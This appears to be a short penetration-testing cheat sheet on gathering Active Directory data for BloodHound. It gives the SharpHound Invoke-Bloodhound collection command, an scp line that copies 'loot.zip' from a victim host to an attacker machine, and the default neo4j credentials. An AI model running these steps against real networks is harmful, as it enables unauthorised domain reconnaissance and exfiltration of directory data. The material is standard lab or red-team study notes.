### collecting data (ingesting)

There are two different methods to ingest data for Bloodhound

1) Sharphound
2) Python script


---

### Sharphound

You will need control on a domain machine.

These commands will gather the .json files you need to run Bloodhound

`Sharphound.ps1`
`Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip`

transfer loot.zip to attacker machine

`scp -T victim@10.10.18.217:<file location> <attacker directory>`

---

### starting bloodhound

start neo4j first
`neo4j console` 

default creds - `neo4j:neo4j`

start `bloodhound`

you can drag and drop loot.zip

**side note: you can clear previous data under `database info` tab > clear db**

---

